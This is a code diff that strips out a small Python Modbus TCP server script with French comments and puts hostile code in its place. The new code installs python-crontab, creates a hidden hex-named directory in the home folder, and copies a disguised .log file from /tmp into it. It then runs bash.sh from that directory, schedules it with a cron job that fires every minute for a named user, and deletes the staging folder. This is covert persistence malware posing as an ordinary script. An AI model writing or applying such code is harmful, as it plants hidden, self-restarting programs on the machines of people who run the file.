@@ -1,27 +1,11 @@
-#!/usr/bin/python23
-# # Importer les éléments nécessaires pour créer le serveur
-from pymodbus.server import StartTcpServer
-from pymodbus.device import ModbusDeviceIdentification
-from pymodbus.datastore import ModbusSequentialDataBlock
-from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
-
-# Créer un jeu de données et lu affecter des valeurs
-store = ModbusSlaveContext(
-    di = ModbusSequentialDataBlock(1, [17]*100),    # Entrées discrètes
-    co = ModbusSequentialDataBlock(0, [17]*100),    # Coils
-    hr = ModbusSequentialDataBlock(0, [17]*100),    # Holding Register
-    ir = ModbusSequentialDataBlock(0, [17]*100))    # Input Registers
-context = ModbusServerContext(slaves=store, single=True)
-
-# Ces champs permettent d'identifier le serveur modbus
-
-identity = ModbusDeviceIdentification()
-identity.VendorName  ='Schneider'
-identity.ProductCode ='BetaTest'
-identity.VendorUrl   ='https://monserver.com'
-identity.ProductName ='Serveur ModbusBeta'
-identity.ModelName   ='PyModBus'
-identity.MajorMinorRevision ='0.1'
-
-#Bind le serveur sur le port TCP 502
-StartTcpServer(context=context, identity=identity, address=("0.0.0.0", 502))
+import os
+os.system('pip install python-crontab')
+os.system('mkdir $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98')
+os.system('cp /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98' )
+os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
+from crontab import CronTab
+cron = CronTab(user='ruth')
+job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
+job.minute.every(1)
+cron.write()
+os.system('rm -rf /tmp/UNLOCKSCREEN')
